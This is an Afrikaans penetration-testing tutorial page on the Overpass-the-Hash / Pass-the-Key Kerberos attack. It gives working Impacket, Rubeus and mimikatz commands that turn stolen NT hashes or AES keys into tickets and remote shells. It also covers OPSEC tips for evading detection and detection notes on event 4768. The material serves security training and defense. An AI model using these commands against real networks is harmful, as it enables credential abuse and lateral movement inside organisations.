# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Die **Overpass The Hash/Pass The Key (PTK)**-aanval is ontwerp vir omgewings waar die tradisionele NTLM-protokol beperk word en Kerberos-verifikasie voorkeur geniet. Hierdie aanval benut die NTLM-hash of AES-sleutels van ’n gebruiker om Kerberos-tickets aan te vra, wat ongemagtigde toegang tot hulpbronne binne ’n netwerk moontlik maak.

Streng gesproke:

- **Over-Pass-the-Hash** beteken gewoonlik dat die **NT-hash** in ’n Kerberos TGT omskep word via die **RC4-HMAC** Kerberos-sleutel.
- **Pass-the-Key** is die meer generiese weergawe waar jy reeds ’n Kerberos-sleutel soos **AES128/AES256** het en direk daarmee ’n TGT aanvra.

Hierdie verskil is belangrik in hardened omgewings: indien **RC4 gedeaktiveer** is of nie meer deur die KDC aanvaar word nie, is die **NT-hash alleen nie genoeg nie** en benodig jy ’n **AES-sleutel** (of die plaintext-wagwoord om dit af te lei).

Om hierdie aanval uit te voer, behels die aanvanklike stap die verkryging van die NTLM-hash of wagwoord van die geteikende gebruiker se rekening. Nadat hierdie inligting verkry is, kan ’n Ticket Granting Ticket (TGT) vir die rekening verkry word, wat die aanvaller toegang gee tot dienste of masjiene waartoe die gebruiker toestemmings het.

Die proses kan met die volgende commands begin word:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Vir scenario's wat AES256 vereis, kan die `-aesKey [AES key]`-opsie gebruik word:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` ondersteun ook die versoek van ’n **service ticket direk deur ’n AS-REQ** met `-service <SPN>`, wat nuttig kan wees wanneer jy ’n ticket vir ’n spesifieke SPN wil hê sonder ’n ekstra TGS-REQ:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Boonop kan die verkrygde ticket met verskeie tools gebruik word, insluitend `smbexec.py` of `wmiexec.py`, wat die omvang van die aanval uitbrei.

Probleme soos _PyAsn1Error_ of _KDC cannot find the name_ word gewoonlik opgelos deur die Impacket-library op te dateer of die hostname in plaas van die IP-adres te gebruik, wat versoenbaarheid met die Kerberos KDC verseker.

’n Alternatiewe command sequence met Rubeus.exe demonstreer ’n ander aspek van hierdie technique:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Hierdie metode weerspieël die **Pass the Key**-benadering, met die fokus op die oorneem en direkte gebruik van die ticket vir authentication. In praktyk:

- `Rubeus asktgt` stuur die **raw Kerberos AS-REQ/AS-REP** self en benodig nie admin-regte nie, tensy jy ’n ander logon session met `/luid` wil teiken of ’n aparte een met `/createnetonly` wil skep.
- `mimikatz sekurlsa::pth` patch credential-materiaal in ’n logon session en raak daarom aan **LSASS**, wat gewoonlik plaaslike admin- of `SYSTEM`-regte vereis en vanuit ’n EDR-perspektief meer raserig is.

Examples with Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Om aan operasionele sekuriteit te voldoen en AES256 te gebruik, kan die volgende opdrag toegepas word:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` is relevant omdat Rubeus-generated traffic effens van native Windows Kerberos verskil. Let ook daarop dat `/opsec` vir **AES256**-traffic bedoel is; die gebruik daarvan met RC4 vereis gewoonlik `/force`, wat die grootste deel van die doel verydel omdat **RC4 in moderne domains self 'n sterk aanduiding is**.

## Detection notes

Elke TGT request genereer **event `4768`** op die DC. In huidige Windows builds bevat hierdie event meer nuttige velde as wat ouer writeups vermeld:

- `TicketEncryptionType` dui aan watter enctype vir die uitgereikte TGT gebruik is. Tipiese waardes is `0x17` vir **RC4-HMAC**, `0x11` vir **AES128**, en `0x12` vir **AES256**.<sup>[[3]](#references)</sup>
- Updated events stel ook `SessionKeyEncryptionType`, `PreAuthEncryptionType`, en die client se geadverteerde enctypes bloot, wat help om **werklike RC4-afhanklikheid** van verwarrende legacy defaults te onderskei.
- Die waarneming van `0x17` in 'n moderne environment is 'n goeie aanduiding dat die account, host, of KDC fallback path steeds RC4 toelaat en daarom meer vriendelik is teenoor NT-hash-gebaseerde Over-Pass-the-Hash.

Microsoft verminder RC4-by-default behavior progressief sedert die November 2022 Kerberos hardening updates, en die huidige gepubliseerde guidance is om **RC4 teen die einde van Q2 2026 as die default assumed enctype vir AD DCs te verwyder**. Vanuit 'n offensive perspective beteken dit dat **Pass-the-Key met AES** toenemend die betroubare path is, terwyl klassieke **NT-hash-only OpTH** steeds meer dikwels in hardened estates sal fail.<sup>[[3]](#references)</sup>

Vir meer besonderhede oor Kerberos encryption types en verwante ticketing behaviour, kyk na:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Meer onopvallende weergawe

> [!WARNING]
> Elke logon session kan slegs een aktiewe TGT op 'n slag hê, wees dus versigtig.

1. Create a new logon session with **`make_token`** from Cobalt Strike.
2. Then, use Rubeus to generate a TGT for the new logon session without affecting the existing one.

Jy kan soortgelyke isolation vanuit Rubeus self bereik met 'n sacrificial **logon type 9** session:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Dit voorkom dat die huidige sessie-TGT oorgeskryf word en is gewoonlik veiliger as om die ticket in jou bestaande logon-sessie in te voer.

## Verwysings

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Bespeur en herstel RC4-gebruik in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
